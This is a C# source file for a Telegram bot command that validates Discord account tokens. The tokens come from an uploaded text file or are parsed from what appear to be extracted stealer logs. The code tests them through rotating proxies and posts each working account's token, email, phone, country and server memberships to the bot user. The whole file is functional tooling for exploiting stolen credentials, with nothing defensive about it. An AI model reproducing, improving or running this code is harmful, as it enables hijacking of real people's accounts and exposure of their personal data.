using System.Text;

using Bot.Core.Models;
using Bot.Core.Models.Checkers.Abstractions;
using Bot.Core.Models.Commands.Abstractions;
using Bot.Core.Models.Commands.Base;
using Bot.Core.Models.Parsers.Abstractions;
using Bot.Services.Proxies.Services;

using Hangfire;

using Injectio.Attributes;

using Microsoft.AspNetCore.Components;

using Newtonsoft.Json;

using TL;

using WTelegram;

namespace Bot.Telegram.Commands.User.Services {
	[RegisterTransient<ICommand<UpdateNewMessage>>(ServiceKey = Keys.Services.Discord), RegisterTransient<ICommand<UpdateBotCallbackQuery>>(ServiceKey = Keys.Services.DiscordCallback)]
	public class Discord(
		Client client,
		Proxies proxies,
		IParserStream<Bot.Services.Discord.Models.User> parser,
		IChecker<Bot.Services.Discord.Models.User> checker,
		IConfiguration config,
		ILogger<Discord> logger) : BaseView(client) {
		private ICollection<Bot.Services.Discord.Models.User>? _tokens = null;
		private string? _path = null; 

		#region BuildMessage

		public override Task<string> BuildMessage(UpdateNewMessage update, TL.User user) {
			if (update is not {message: Message {media: MessageMediaDocument {document: Document document}}}) {
				return Task.FromResult("File with tokens not found");
			}

			if (document.mime_type != "text/plain") {
				return Task.FromResult("File is not of type .txt");
			}

			return Task.FromResult($"Start processing: {document.Filename}");
		}

		public override Task<string> BuildMessage(UpdateBotCallbackQuery update, TL.User user) {
			return Task.FromResult($"Start processing: {Encoding.UTF8.GetString(update.data[1..])}");
		}

		#endregion

		protected override async Task<bool> IsValidAsync(object args, TL.User user) {
			if (args is UpdateNewMessage {message: Message {media: MessageMediaDocument {document: Document {mime_type: "text/plain"} document}}}) {
				using (var memory = new MemoryStream()) {

					await client.DownloadFileAsync(document, memory);

					memory.Seek(0, SeekOrigin.Begin);

					using (var reader = new StreamReader(memory)) {
						_tokens = (await reader.ReadToEndAsync()).Split('\n').Where(x => !string.IsNullOrEmpty(x)).Select(x => (Bot.Services.Discord.Models.User)x).ToList();
					}
				}
			} else if (args is UpdateBotCallbackQuery { data: var data }) {
				_path = config.GetPath(data, Paths.Extracted).path;
			} else {
				return false;
			}

			return true;
		}

		protected override Task ProcessAsync(object args, TL.User user) {
			BackgroundJob.Enqueue(() => InvokeAsync(_path, _tokens, user));
			
			return Task.CompletedTask;
		}

		protected override Task<ReplyInlineMarkup?> DefaultMarkup(object args, TL.User user) {
			return Task.FromResult<ReplyInlineMarkup?>(new() {
				rows = [
					new() {
						buttons = [
							Keys.Common.Dispose_Button
						]
					}
				]
			});
		}

		// Hangfire
		public async Task InvokeAsync(string? path, ICollection<Bot.Services.Discord.Models.User>? tokens, TL.User user) {
			logger.LogInformation("[Discord] Parsing tokens");
			tokens ??= await parser.FromLogs(path!).ToListAsync();
					
			logger.LogInformation("[Discord] Taking proxy");
			var proxy_list = await proxies.TakeAsync(int.Parse(config["Multithreading:Proxy:MaxThreads"]!)).ToListAsync();

			logger.LogInformation("[Discord] Start processing");
			tokens.WithThreads(
				int.Parse(config["Multithreading:Proxy:MaxThreads"]!),
				async (account, index) => {
					var proxy = proxy_list[index];

					using (var http = (HttpClient)proxy) {
						return await checker.CheckAsync(account, http) && await checker.DetailsAsync(account, http);
					}
				},
				async (account, _) => {
					var text = $$"""
								 {{account.Username}}

								 Token: `{{account.Token}}`
								 Email: {{(string.IsNullOrEmpty(account.Email) ? "None" : account.Email)}}
								 Phone: {{(string.IsNullOrEmpty(account.Phone) ? "None" : account.Phone)}}
								 Country: {{(string.IsNullOrEmpty(account.CountryCode) ? "Unknown" : account.CountryCode)}}
								 Verified: {{(account.Verified ? "True" : "False")}}
								 Premium: {{account.PremiumType.ToString()}}

								 Guilds: {{account.Guilds.Count}}

								 {{string.Join('\n', account.Guilds.Select(x => $"\tName: {x.Name}\n\tStatus: {(x.IsOwner ? "Owner" : "Member")}\n"))}}
								 """;

#if DEBUG
					logger.LogDebug("[Discord] Try to send: \n{account}\n{content}", JsonConvert.SerializeObject(account, Formatting.Indented), text);
#endif
                            
					var entities = client.MarkdownToEntities(ref text);
							
					await client.SendMessageAsync(
						user,
						text,
						media: account.AvatarId is not null ? new InputMediaPhotoExternal {
							url = $"https://cdn.discordapp.com/avatars/{account.Id}/{account.AvatarId}.webp"
						} : null,
						entities: entities
					);
				}
			);
			
			logger.LogInformation("[Discord] Checking completed");
			foreach (var proxy in proxy_list) {
				await proxy.DisposeAsync();
			}
		}
	}
}